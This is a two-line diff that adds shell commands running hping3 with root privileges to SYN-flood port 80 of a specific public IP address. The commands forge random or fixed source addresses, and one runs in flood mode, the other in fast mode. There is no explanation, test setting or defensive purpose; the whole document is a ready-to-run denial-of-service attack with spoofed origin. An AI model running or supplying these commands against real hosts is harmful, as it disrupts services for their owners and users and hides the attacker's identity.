@@ -1,0 +1,2 @@
+sudo hping3 --rand-source -S -p 80 --spoof 1.2.3.4 --flood 34.175.74.25
+sudo hping3 --rand-source -S -p 80 --spoof 1.2.3.4 --fast 34.175.74.25
